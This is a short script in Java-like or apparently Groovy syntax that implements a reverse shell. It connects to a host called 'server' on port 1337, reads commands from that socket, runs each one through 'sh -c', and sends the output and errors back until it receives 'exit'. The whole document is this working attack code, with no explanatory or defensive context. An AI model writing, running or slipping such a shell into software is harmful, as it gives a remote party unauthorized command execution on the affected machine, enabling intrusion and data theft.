import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.Socket;

Socket client = new Socket("server", 1337);

InputStreamReader input = new InputStreamReader(client.getInputStream());
PrintStream writer = new PrintStream(client.getOutputStream());
writer.print("Yo!\n");

BufferedReader bri = new BufferedReader(input);
String str = bri.readLine();

while (!str.matches("exit")) {
	try {
		String[] command = new [ "sh", "-c", str ];
		Process p = Runtime.getRuntime().exec(command);

		for(InputStream inputCommand: [ p.getInputStream(), p.getErrorStream() ]) {
			BufferedReader br = new BufferedReader(new InputStreamReader(inputCommand));
			String line;
			while ((line = br.readLine()) != null) {
				writer.println(line);
			}
		}

	}catch(Exception e) {
		writer.println("Problemas: "+e.getMessage());
	} finally {
		str = bri.readLine();
	}
}

input.close();
writer.close();
client.close();
